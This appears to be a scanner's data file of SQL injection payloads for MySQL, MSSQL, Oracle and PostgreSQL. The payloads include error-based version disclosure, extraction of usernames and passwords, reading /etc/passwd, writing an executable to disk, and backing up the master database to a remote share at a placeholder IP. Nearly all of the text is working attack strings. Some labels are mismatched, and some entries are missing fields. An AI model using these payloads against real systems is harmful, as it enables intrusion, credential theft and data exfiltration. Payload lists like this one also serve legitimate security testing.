attack.label: DB type/versions
attack.name: 1 and row(1,1)>(select count(*),
attack.code: 1 and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)--
attack.desc: MySQL: 1 and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)--

attack.name: (1)and(select 1 from(select count(*
attack.code: (1)and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from TABLE_NAME group by x)a)--
attack.desc: MySQL: (1)and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from TABLE_NAME group by x)a)--

attack.label: destructive tests
attack.name: x'; SELECT sc.Text FROM syscomments
attack.code: x'; SELECT sc.Text FROM syscomments sc JOIN sysobjects so ON so.id = sc.id WHERE so.Name LIKE '%PROC_NAME%'
attack.desc: MSSQL: x'; SELECT sc.Text FROM syscomments sc JOIN sysobjects so ON so.id = sc.id WHERE so.Name LIKE '%PROC_NAME%'

attack.label: destructive tests
attack.name: -1 UNION SELECT CONCAT(username,0x3
attack.desc: Oracle: -1 UNION SELECT CONCAT(username,0x3a,password) FROM jos_users--

attack.label: read/write files on filesystem

attack.code: x'; BACKUP database master to disks='\\{IP}\{sharename}\backupdb.dat' -- -z

attack.code: x'; create table myfile (record varchar(2000)) external file at "c:\temp\file.exe" insert into myfile values(0xBINARY_DATA)" --

attack.code: create table afile (input TEXT); load data infile '/etc/passwd' into table afile -- #

attack.label: read/write files on filesystem

attack.label: read/write files on filesystem
attack.name: create table afile (input TEXT); co
attack.code: create table afile (input TEXT); copy afile from '/etc/passwd'; select * from afile

attack.code: select convert(int,(select table_name from(select row_number() over (order by table_name) as rownum,table_name from information_schema.tables) as t where t.rownum=1))--

attack.label: blind injection tests
attack.name: Oracle>9.0
attack.code: 1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--
attack.desc: Oracle: 1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--
